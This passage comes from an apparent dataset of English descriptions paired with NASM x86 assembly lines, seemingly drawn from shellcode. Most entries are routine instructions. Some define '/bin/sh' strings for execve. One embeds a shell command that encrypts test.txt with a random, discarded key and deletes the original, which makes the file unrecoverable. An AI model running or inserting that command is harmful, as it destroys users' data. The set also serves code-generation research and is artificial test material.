      "'",
      ",",
      "0xa"
    ]
  },
  {
    "intent": "define msg variable and initialize with 'i love you!'",
    "rewritten_intent": "define msg variable and initialize with 'i love you!'",
    "snippet": "msg db 'i love you!', 0ah",
    "slot_map": {
      "'i love you!'": "var0"
    },
    "intent_tokens": [
      "define",
      "msg",
      "variable",
      "and",
      "initialize",
      "var0"
    ],
    "snippet_tokens": [
      "msg",
      "db",
      "var0",
      ",",
      "0ah"
    ]
  },
  {
    "intent": "define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'",
    "rewritten_intent": "define msg as the byte string 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'",
    "snippet": "msg db 'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt', 0x0a",
    "slot_map": {
      "'mv test.txt .test.txt && head -c 32 /dev/urandom | base64 | openssl aes-256-cbc -e -in .test.txt -out test.txt -pbkdf2 -k - && rm .test.txt'": "var0"
    },
    "intent_tokens": [
      "define",
      "msg",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "msg",
      "db",
      "var0",
      ",",
      "0x0a"
    ]
  },
  {
    "intent": "define msg as the byte string 'we found the egg!'",
    "rewritten_intent": "define msg as the byte string 'we found the egg!'",
    "snippet": "msg db 'we found the egg!', 0ah, 0dh",
    "slot_map": {
      "'we found the egg!'": "var0"
    },
    "intent_tokens": [
      "define",
      "msg",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "msg",
      "db",
      "var0",
      ",",
      "0ah",
      ",",
      "0dh"
    ]
  },
  {
    "intent": "define msg_len equal to the length of msg",
    "rewritten_intent": "define msg_len equal to the length of msg",
    "snippet": "msg_len equ $-msg",
    "slot_map": {
      "msg_len": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "equal",
      "length",
      "msg"
    ],
    "snippet_tokens": [
      "var0",
      "equ",
      "$",
      "-msg"
    ]
  },
  {
    "intent": "declare message string msg1 containing 'hello brave new world!'",
    "rewritten_intent": "declare message string msg1 containing 'hello brave new world!'",
    "snippet": "msg1 db 'hello, brave new world!', 0ah",
    "slot_map": {
      "'hello brave new world!'": "var1",
      "msg1": "var0"
    },
    "intent_tokens": [
      "declare",
      "message",
      "string",
      "var0",
      "containing",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "db",
      "``",
      "hello",
      ",",
      "brave",
      "new",
      "world",
      "!",
      "``",
      ",",
      "0ah"
    ]
  },
  {
    "intent": "define msg2 as the byte string 'passwd'",
    "rewritten_intent": "define msg2 as the byte string 'passwd'",
    "snippet": "msg2 db 'passwd', 0x00",
    "slot_map": {
      "'passwd'": "var1",
      "msg2": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "byte",
      "string",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "db",
      "var1",
      ",",
      "0x00"
    ]
  },
  {
    "intent": "declare message string msg2 containing 'this is how we recycle in nasm'",
    "rewritten_intent": "declare message string msg2 containing 'this is how we recycle in nasm'",
    "snippet": "msg2 db 'this is how we recycle in nasm.', 0ah",
    "slot_map": {
      "'this is how we recycle in nasm'": "var1",
      "msg2": "var0"
    },
    "intent_tokens": [
      "declare",
      "message",
      "string",
      "var0",
      "containing",
      "var1"
    ],
    "snippet_tokens": [
      "var0",
      "db",
      "``",
      "this",
      "is",
      "how",
      "we",
      "recycle",
      "in",
      "nasm",
      ".",
      "``",
      ",",
      "0ah"
    ]
  },
  {
    "intent": "declare msglength to have the constant value 12",
    "rewritten_intent": "declare msglength to have the constant value 12",
    "snippet": "msglength: equ 12",
    "slot_map": {
      "msglength": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "have",
      "constant",
      "value",
      "12"
    ],
    "snippet_tokens": [
      "var0",
      ":",
      "equ",
      "12"
    ]
  },
  {
    "intent": "multiply the contents of eax by the 32-bit contents of the memory location tmp",
    "rewritten_intent": "multiply the contents of eax by the 32-bit contents of the memory location tmp",
    "snippet": "mul [tmp]",
    "slot_map": {
      "32-bit": "var1",
      "eax": "var0",
      "tmp": "var2"
    },
    "intent_tokens": [
      "multiply",
      "contents",
      "var0",
      "var1",
      "contents",
      "memory",
      "location",
      "var2"
    ],
    "snippet_tokens": [
      "mul",
      "[",
      "var2",
      "]"
    ]
  },
  {
    "intent": "multiply the contents of eax by the 32-bit contents of the memory location value",
    "rewritten_intent": "multiply the contents of eax by the 32-bit contents of the memory location value",
    "snippet": "mul [value]",
    "slot_map": {
      "32-bit": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "multiply",
      "contents",
      "var0",
      "var1",
      "contents",
      "memory",
      "location",
      "value"
    ],
    "snippet_tokens": [
      "mul",
      "[",
      "value",
      "]"
    ]
  },
  {
    "intent": "multiply the contents of eax by the 32-bit contents of the memory location var",
    "rewritten_intent": "multiply the contents of eax by the 32-bit contents of the memory location var",
    "snippet": "mul [var]",
    "slot_map": {
      "32-bit": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "multiply",
      "contents",
      "var0",
      "var1",
      "contents",
      "memory",
      "location",
      "var"
    ],
    "snippet_tokens": [
      "mul",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "multiply eax by 0x10 and stores the result in edx:eax",
    "rewritten_intent": "multiply eax by 0x10 and stores the result in edx:eax",
    "snippet": "mul 0x10",
    "slot_map": {
      "0x10": "var2",
      "eax": "var0",
      "edx": "var3"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "var2",
      "and",
      "stores",
      "result",
      "edx",
      ":",
      "var0"
    ],
    "snippet_tokens": [
      "mul",
      "var2"
    ]
  },
  {
    "intent": "multiply the contents of eax by 25",
    "rewritten_intent": "multiply the contents of eax by 25",
    "snippet": "mul 25",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "multiply",
      "contents",
      "var0",
      "25"
    ],
    "snippet_tokens": [
      "mul",
      "25"
    ]
  },
  {
    "intent": "multiply the contents of eax by 3",
    "rewritten_intent": "multiply the contents of eax by 3",
    "snippet": "mul 3",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "multiply",
      "contents",
      "var0",
      "3"
    ],
    "snippet_tokens": [
      "mul",
      "3"
    ]
  },
  {
    "intent": "multiply the contents of eax by ebx",
    "rewritten_intent": "multiply the contents of eax by ebx",
    "snippet": "mul ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "multiply",
      "contents",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mul",
      "var1"
    ]
  },
  {
    "intent": "multiply the contents of the eax register by the contents of the ebx register",
    "rewritten_intent": "multiply the contents of the eax register by the contents of the ebx register",
    "snippet": "mul ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "multiply",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mul",
      "var1"
    ]
  },
  {
    "intent": "multiply eax by ebx",
    "rewritten_intent": "multiply eax by ebx",
    "snippet": "mul ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mul",
      "var1"
    ]
  },
  {
    "intent": "multiply eax by the contents of the ebx register",
    "rewritten_intent": "multiply eax by the contents of the ebx register",
    "snippet": "mul ebx",
    "slot_map": {
      "eax": "var0",
      "ebx": "var1"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mul",
      "var1"
    ]
  },
  {
    "intent": "mul eax by ebx",
    "rewritten_intent": "mul eax by ebx",
    "snippet": "mul ebx",
    "slot_map": {
      "mul": "var0",
      "eax": "var1",
      "ebx": "var2"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "var2"
    ]
  },
  {
    "intent": "mul eax by ecx",
    "rewritten_intent": "mul eax by ecx",
    "snippet": "mul ecx",
    "slot_map": {
      "mul": "var0",
      "eax": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "var2"
    ]
  },
  {
    "intent": "multiply eax by the contents of the ecx register",
    "rewritten_intent": "multiply eax by the contents of the ecx register",
    "snippet": "mul ecx",
    "slot_map": {
      "eax": "var0",
      "ecx": "var1"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mul",
      "var1"
    ]
  },
  {
    "intent": "mutliply eax by ecx",
    "rewritten_intent": "mutliply eax by ecx",
    "snippet": "mul ecx",
    "slot_map": {
      "mutliply": "var0",
      "eax": "var1",
      "ecx": "var2"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "var2"
    ],
    "snippet_tokens": [
      "mul",
      "var2"
    ]
  },
  {
    "intent": "multiply eax by the contents of the edx register",
    "rewritten_intent": "multiply eax by the contents of the edx register",
    "snippet": "mul edx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "mul",
      "var1"
    ]
  },
  {
    "intent": "mul eax by edx",
    "rewritten_intent": "mul eax by edx",
    "snippet": "mul edx",
    "slot_map": {
      "mul": "var0",
      "eax": "var1",
      "edx": "var2"
    },
    "intent_tokens": [
      "var0",
      "var1",
      "var2"
    ],
    "snippet_tokens": [
      "var0",
      "var2"
    ]
  },
  {
    "intent": "multiply eax by edx",
    "rewritten_intent": "multiply eax by edx",
    "snippet": "mul edx",
    "slot_map": {
      "eax": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "multiply",
      "var0",
      "var1"
    ],
    "snippet_tokens": [
      "mul",
      "var1"
    ]
  },
  {
    "intent": "allocate 10 words each initialized to 0",
    "rewritten_intent": "allocate 10 words each initialized to 0",
    "snippet": "my_table times 10 dw 0",
    "slot_map": {},
    "intent_tokens": [
      "allocate",
      "10",
      "words",
      "initialized",
      "0"
    ],
    "snippet_tokens": [
      "my_table",
      "times",
      "10",
      "dw",
      "0"
    ]
  },
  {
    "intent": "allocate my_table vector of 10 words each initialized to 0",
    "rewritten_intent": "allocate my_table vector of 10 words each initialized to 0",
    "snippet": "my_table times 10 dw 0",
    "slot_map": {
      "my_table": "var0"
    },
    "intent_tokens": [
      "allocate",
      "var0",
      "vector",
      "10",
      "words",
      "initialized",
      "0"
    ],
    "snippet_tokens": [
      "var0",
      "times",
      "10",
      "dw",
      "0"
    ]
  },
  {
    "intent": "define my_var word variable and initialize it to 0abcdh",
    "rewritten_intent": "define my_var word variable and initialize it to 0abcdh",
    "snippet": "my_var dw 0abcdh",
    "slot_map": {
      "my_var": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "word",
      "variable",
      "and",
      "initialize",
      "it",
      "0abcdh"
    ],
    "snippet_tokens": [
      "var0",
      "dw",
      "0abcdh"
    ]
  },
  {
    "intent": "define myList array of word and initialize it to 1, 2, 3, 4, and 5",
    "rewritten_intent": "define myList array of word and initialize it to 1, 2, 3, 4, and 5",
    "snippet": "myList word 1,2,3,4,5",
    "slot_map": {
      "myList": "var0"
    },
    "intent_tokens": [
      "define",
      "var0",
      "array",
      "word",
      "and",
      "initialize",
      "it",
      "1",
      ",",
      "2",
      ",",
      "3",
      ",",
      "4",
      ",",
      "and",
      "5"
    ],
    "snippet_tokens": [
      "var0",
      "word",
      "1,2,3,4,5"
    ]
  },
  {
    "intent": "define name as the byte string '/bin/sh'",
    "rewritten_intent": "define name as the byte string '/bin/sh'",
    "snippet": "name db '/bin/sh', 0",
    "slot_map": {
      "'/bin/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "name",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "name",
      "db",
      "var0",
      ",",
      "0"
    ]
  },
  {
    "intent": "allocate memory for 30 bytes uninitialized name variable",
    "rewritten_intent": "allocate memory for 30 bytes uninitialized name variable",
    "snippet": "name db 30 dup",
    "slot_map": {
      "for": "var0",
      "uninitialized": "var1"
    },
    "intent_tokens": [
      "allocate",
      "memory",
      "var0",
      "30",
      "bytes",
      "var1",
      "name",
      "variable"
    ],
    "snippet_tokens": [
      "name",
      "db",
      "30",
      "dup"
    ]
  },
  {
    "intent": "negate eax",
    "rewritten_intent": "negate eax",
    "snippet": "neg eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "negate",
      "var0"
    ],
    "snippet_tokens": [
      "neg",
      "var0"
    ]
  },
  {
    "intent": "negate the contents of eax",
    "rewritten_intent": "negate the contents of eax",
    "snippet": "neg eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "negate",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "neg",
      "var0"
    ]
  },
  {
    "intent": "replaces the contents of the eax register with its two's complement",
    "rewritten_intent": "replaces the contents of the eax register with its two's complement",
    "snippet": "neg eax",
    "slot_map": {
      "eax": "var0",
      "'s": "var1"
    },
    "intent_tokens": [
      "replaces",
      "contents",
      "var0",
      "register",
      "its",
      "two",
      "'s",
      "complement"
    ],
    "snippet_tokens": [
      "neg",
      "var0"
    ]
  },
  {
    "intent": "replaces the contents of the ebx register with its two's complement",
    "rewritten_intent": "replaces the contents of the ebx register with its two's complement",
    "snippet": "neg ebx",
    "slot_map": {
      "ebx": "var0",
      "'s": "var1"
    },
    "intent_tokens": [
      "replaces",
      "contents",
      "var0",
      "register",
      "its",
      "two",
      "'s",
      "complement"
    ],
    "snippet_tokens": [
      "neg",
      "var0"
    ]
  },
  {
    "intent": "replaces the contents of the ecx register with its two's complement",
    "rewritten_intent": "replaces the contents of the ecx register with its two's complement",
    "snippet": "neg ecx",
    "slot_map": {
      "ecx": "var0",
      "'s": "var1"
    },
    "intent_tokens": [
      "replaces",
      "contents",
      "var0",
      "register",
      "its",
      "two",
      "'s",
      "complement"
    ],
    "snippet_tokens": [
      "neg",
      "var0"
    ]
  },
  {
    "intent": "negate edi",
    "rewritten_intent": "negate edi",
    "snippet": "neg edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "negate",
      "var0"
    ],
    "snippet_tokens": [
      "neg",
      "var0"
    ]
  },
  {
    "intent": "replaces the contents of the edi register with its two's complement",
    "rewritten_intent": "replaces the contents of the edi register with its two's complement",
    "snippet": "neg edi",
    "slot_map": {
      "edi": "var0",
      "'s": "var1"
    },
    "intent_tokens": [
      "replaces",
      "contents",
      "var0",
      "register",
      "its",
      "two",
      "'s",
      "complement"
    ],
    "snippet_tokens": [
      "neg",
      "var0"
    ]
  },
  {
    "intent": "replaces the contents of the edx register with its two's complement",
    "rewritten_intent": "replaces the contents of the edx register with its two's complement",
    "snippet": "neg edx",
    "slot_map": {
      "edx": "var0",
      "'s": "var1"
    },
    "intent_tokens": [
      "replaces",
      "contents",
      "var0",
      "register",
      "its",
      "two",
      "'s",
      "complement"
    ],
    "snippet_tokens": [
      "neg",
      "var0"
    ]
  },
  {
    "intent": "negate the contents of var",
    "rewritten_intent": "negate the contents of var",
    "snippet": "neg var",
    "slot_map": {},
    "intent_tokens": [
      "negate",
      "contents",
      "var"
    ],
    "snippet_tokens": [
      "neg",
      "var"
    ]
  },
  {
    "intent": "define the variable neg_number of words and initialize it to -12345",
    "rewritten_intent": "define the variable neg_number of words and initialize it to -12345",
    "snippet": "neg_number dw -12345",
    "slot_map": {
      "neg_number": "var0",
      "to -12345": "var2"
    },
    "intent_tokens": [
      "define",
      "variable",
      "var0",
      "words",
      "and",
      "initialize",
      "it",
      "-12345"
    ],
    "snippet_tokens": [
      "var0",
      "dw",
      "-12345"
    ]
  },
  {
    "intent": "define negative label",
    "rewritten_intent": "define negative label",
    "snippet": "negative:",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "negative",
      "label"
    ],
    "snippet_tokens": [
      "negative",
      ":"
    ]
  },
  {
    "intent": "declare next_addr function",
    "rewritten_intent": "declare next_addr function",
    "snippet": "next_addr:",
    "slot_map": {
      "next_addr": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the next_addr label",
    "rewritten_intent": "declare the next_addr label",
    "snippet": "next_addr:",
    "slot_map": {
      "next_addr": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the next_cycle label",
    "rewritten_intent": "declare the next_cycle label",
    "snippet": "next_cycle:",
    "slot_map": {
      "next_cycle": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "label"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare next_page function",
    "rewritten_intent": "declare next_page function",
    "snippet": "next_page:",
    "slot_map": {
      "next_page": "var0"
    },
    "intent_tokens": [
      "declare",
      "var0",
      "function"
    ],
    "snippet_tokens": [
      "var0",
      ":"
    ]
  },
  {
    "intent": "declare the next label",
    "rewritten_intent": "declare the next label",
    "snippet": "next:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "next",
      "label"
    ],
    "snippet_tokens": [
      "next",
      ":"
    ]
  },
  {
    "intent": "do no operation",
    "rewritten_intent": "do no operation",
    "snippet": "nop",
    "slot_map": {},
    "intent_tokens": [
      "do",
      "no",
      "operation"
    ],
    "snippet_tokens": [
      "nop"
    ]
  },
  {
    "intent": "no operation",
    "rewritten_intent": "no operation",
    "snippet": "nop",
    "slot_map": {},
    "intent_tokens": [
      "no",
      "operation"
    ],
    "snippet_tokens": [
      "nop"
    ]
  },
  {
    "intent": "negate all the bits of ax register",
    "rewritten_intent": "negate all the bits of ax register",
    "snippet": "not ax",
    "slot_map": {},
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "not",
      "ax"
    ]
  },
  {
    "intent": "negate all the bits of the ax register",
    "rewritten_intent": "negate all the bits of the ax register",
    "snippet": "not ax",
    "slot_map": {},
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "ax",
      "register"
    ],
    "snippet_tokens": [
      "not",
      "ax"
    ]
  },
  {
    "intent": "negate all bits in the byte at the memory location tmp",
    "rewritten_intent": "negate all bits in the byte at the memory location tmp",
    "snippet": "not byte [tmp]",
    "slot_map": {
      "tmp": "var0"
    },
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "byte",
      "memory",
      "location",
      "var0"
    ],
    "snippet_tokens": [
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "negate all bits in the byte at the memory location var",
    "rewritten_intent": "negate all bits in the byte at the memory location var",
    "snippet": "not byte [var]",
    "slot_map": {},
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "byte",
      "memory",
      "location",
      "var"
    ],
    "snippet_tokens": [
      "not",
      "byte",
      "[",
      "var",
      "]"
    ]
  },
  {
    "intent": "negate all bits in the byte at the memory location var2",
    "rewritten_intent": "negate all bits in the byte at the memory location var2",
    "snippet": "not byte [var2]",
    "slot_map": {
      "var2": "var0"
    },
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "byte",
      "memory",
      "location",
      "var0"
    ],
    "snippet_tokens": [
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "negate all the bits of dl register",
    "rewritten_intent": "negate all the bits of dl register",
    "snippet": "not dl",
    "slot_map": {},
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "not",
      "dl"
    ]
  },
  {
    "intent": "negate all the bits of the eax register",
    "rewritten_intent": "negate all the bits of the eax register",
    "snippet": "not eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "not",
      "var0"
    ]
  },
  {
    "intent": "negate all the bits of ecx register",
    "rewritten_intent": "negate all the bits of ecx register",
    "snippet": "not ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "not",
      "var0"
    ]
  },
  {
    "intent": "negate all the bits of the ecx register",
    "rewritten_intent": "negate all the bits of the ecx register",
    "snippet": "not ecx",
    "slot_map": {
      "ecx": "var0"
    },
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "not",
      "var0"
    ]
  },
  {
    "intent": "negate all the bits of the edi register",
    "rewritten_intent": "negate all the bits of the edi register",
    "snippet": "not edi",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "not",
      "var0"
    ]
  },
  {
    "intent": "perform a bit-wise inversion of edx",
    "rewritten_intent": "perform a bit-wise inversion of edx",
    "snippet": "not edx",
    "slot_map": {
      "bit-wise": "var0",
      "edx": "var1"
    },
    "intent_tokens": [
      "perform",
      "var0",
      "inversion",
      "var1"
    ],
    "snippet_tokens": [
      "not",
      "var1"
    ]
  },
  {
    "intent": "negate all the bits of the esi register",
    "rewritten_intent": "negate all the bits of the esi register",
    "snippet": "not esi",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "negate",
      "all",
      "bits",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "not",
      "var0"
    ]
  },
  {
    "intent": "define number variable of a word and initialize to 12345",
    "rewritten_intent": "define number variable of a word and initialize to 12345",
    "snippet": "number dw 12345",
    "slot_map": {},
    "intent_tokens": [
      "define",
      "number",
      "variable",
      "word",
      "and",
      "initialize",
      "12345"
    ],
    "snippet_tokens": [
      "number",
      "dw",
      "12345"
    ]
  },
  {
    "intent": "reserve 1 byte for number variable",
    "rewritten_intent": "reserve 1 byte for number variable",
    "snippet": "number: resb 1",
    "slot_map": {
      "for": "var0"
    },
    "intent_tokens": [
      "reserve",
      "1",
      "byte",
      "var0",
      "number",
      "variable"
    ],
    "snippet_tokens": [
      "number",
      ":",
      "resb",
      "1"
    ]
  },
  {
    "intent": "declare an array of six words each initialized with the numbers 34 45 56 67 75 89",
    "rewritten_intent": "declare an array of six words each initialized with the numbers 34 45 56 67 75 89",
    "snippet": "numbers dw 34, 45, 56, 67, 75, 89",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "array",
      "six",
      "words",
      "initialized",
      "numbers",
      "34",
      "45",
      "56",
      "67",
      "75",
      "89"
    ],
    "snippet_tokens": [
      "numbers",
      "dw",
      "34",
      ",",
      "45",
      ",",
      "56",
      ",",
      "67",
      ",",
      "75",
      ",",
      "89"
    ]
  },
  {
    "intent": "declare the one label",
    "rewritten_intent": "declare the one label",
    "snippet": "one:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "one",
      "label"
    ],
    "snippet_tokens": [
      "one",
      ":"
    ]
  },
  {
    "intent": "declare one label",
    "rewritten_intent": "declare one label",
    "snippet": "one:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "one",
      "label"
    ],
    "snippet_tokens": [
      "one",
      ":"
    ]
  },
  {
    "intent": "perform or operation between al and bl registers",
    "rewritten_intent": "perform or operation between al and bl registers",
    "snippet": "or al, bl",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "perform",
      "or",
      "operation",
      "al",
      "and",
      "var0",
      "registers"
    ],
    "snippet_tokens": [
      "or",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform or operation between the al register and syscall_execve",
    "rewritten_intent": "perform or operation between the al register and syscall_execve",
    "snippet": "or al, syscall_execve",
    "slot_map": {
      "syscall_execve": "var0"
    },
    "intent_tokens": [
      "perform",
      "or",
      "operation",
      "al",
      "register",
      "and",
      "var0"
    ],
    "snippet_tokens": [
      "or",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform logical or between the cx register and 0xfff",
    "rewritten_intent": "perform logical or between the cx register and 0xfff",
    "snippet": "or cx, 0xfff",
    "slot_map": {
      "0xfff": "var0"
    },
    "intent_tokens": [
      "perform",
      "logical",
      "or",
      "cx",
      "register",
      "and",
      "var0"
    ],
    "snippet_tokens": [
      "or",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "perform or operation between dx and 0xfff and save the result into dx",
    "rewritten_intent": "perform or operation between dx and 0xfff and save the result into dx",
    "snippet": "or dx, 0xfff",
    "slot_map": {
      "0xfff": "var2",
      "dx": "var0"
    },
    "intent_tokens": [
      "perform",
      "or",
      "operation",
      "var0",
      "and",
      "var2",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "or",
      "var0",
      ",",
      "var2"
    ]
  },
  {
    "intent": "perform the or operation between the eax register and 0xffffffff",
    "rewritten_intent": "perform the or operation between the eax register and 0xffffffff",
    "snippet": "or eax, 0xffffffff",
    "slot_map": {
      "0xffffffff": "var1",
      "eax": "var0"
    },
    "intent_tokens": [
      "perform",
      "or",
      "operation",
      "var0",
      "register",
      "and",
      "var1"
    ],
    "snippet_tokens": [
      "or",
      "var0",
      ",",
      "var1"
    ]
  },
  {
    "intent": "declare the output label",
    "rewritten_intent": "declare the output label",
    "snippet": "output:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "output",
      "label"
    ],
    "snippet_tokens": [
      "output",
      ":"
    ]
  },
  {
    "intent": "define path as the byte string '//bin/sh'",
    "rewritten_intent": "define path as the byte string '//bin/sh'",
    "snippet": "path db '//bin/sh'",
    "slot_map": {
      "'//bin/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "path",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "path",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define the byte string path and initialize it to '//bin/sh'",
    "rewritten_intent": "define the byte string path and initialize it to '//bin/sh'",
    "snippet": "path db '//bin/sh'",
    "slot_map": {
      "'//bin/sh'": "var0"
    },
    "intent_tokens": [
      "define",
      "byte",
      "string",
      "path",
      "and",
      "initialize",
      "it",
      "var0"
    ],
    "snippet_tokens": [
      "path",
      "db",
      "var0"
    ]
  },
  {
    "intent": "declare the path label",
    "rewritten_intent": "declare the path label",
    "snippet": "path:",
    "slot_map": {},
    "intent_tokens": [
      "declare",
      "path",
      "label"
    ],
    "snippet_tokens": [
      "path",
      ":"
    ]
  },
  {
    "intent": "pop the top element of the stack into memory at the four bytes starting at location eax",
    "rewritten_intent": "pop the top element of the stack into memory at the four bytes starting at location eax",
    "snippet": "pop [eax]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "pop",
      "top",
      "element",
      "stack",
      "memory",
      "four",
      "bytes",
      "starting",
      "location",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "pop the top element of the stack into memory at the four bytes starting at location ebx",
    "rewritten_intent": "pop the top element of the stack into memory at the four bytes starting at location ebx",
    "snippet": "pop [ebx]",
    "slot_map": {
      "ebx": "var0"
    },
    "intent_tokens": [
      "pop",
      "top",
      "element",
      "stack",
      "memory",
      "four",
      "bytes",
      "starting",
      "location",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "pop the last element pushed onto the stack into ax",
    "rewritten_intent": "pop the last element pushed onto the stack into ax",
    "snippet": "pop ax",
    "slot_map": {},
    "intent_tokens": [
      "pop",
      "last",
      "element",
      "pushed",
      "stack",
      "ax"
    ],
    "snippet_tokens": [
      "pop",
      "ax"
    ]
  },
  {
    "intent": "pop the last element pushed onto the stack into bx",
    "rewritten_intent": "pop the last element pushed onto the stack into bx",
    "snippet": "pop bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "pop",
      "last",
      "element",
      "pushed",
      "stack",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "pop the value on the stack back into cx",
    "rewritten_intent": "pop the value on the stack back into cx",
    "snippet": "pop cx",
    "slot_map": {},
    "intent_tokens": [
      "pop",
      "value",
      "stack",
      "back",
      "cx"
    ],
    "snippet_tokens": [
      "pop",
      "cx"
    ]
  },
  {
    "intent": "restore the top of the stack into the cx register",
    "rewritten_intent": "restore the top of the stack into the cx register",
    "snippet": "pop cx",
    "slot_map": {},
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "cx",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "cx"
    ]
  },
  {
    "intent": "pop the value on the stack back into dx",
    "rewritten_intent": "pop the value on the stack back into dx",
    "snippet": "pop dx",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "pop",
      "value",
      "stack",
      "back",
      "var0"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "restore the top of the stack into the dx register",
    "rewritten_intent": "restore the top of the stack into the dx register",
    "snippet": "pop dx",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "restore",
      "top",
      "stack",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "pop",
      "var0"
    ]
  },
  {
    "intent": "pop the value on the stack back into eax",
    "rewritten_intent": "pop the value on the stack back into eax",
    "snippet": "pop eax",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "pop",
      "value",
      "stack",
      "back",
